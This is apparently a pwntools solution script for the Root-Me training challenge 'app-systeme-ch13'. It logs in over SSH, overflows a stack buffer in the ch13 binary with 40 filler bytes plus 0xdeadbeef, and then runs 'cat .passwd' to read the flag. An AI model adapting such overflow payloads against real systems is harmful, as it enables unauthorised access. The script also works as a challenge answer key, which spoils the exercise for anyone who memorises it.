from pwn import*

s = ssh(host='challenge02.root-me.org' ,user='app-systeme-ch13' ,password='app-systeme-ch13',port=2222)
p = s.process('./ch13')

payload = b"a"*40 + p32(0xdeadbeef)
p.sendline(payload)

p.sendline('cat .passwd')
p.interactive()
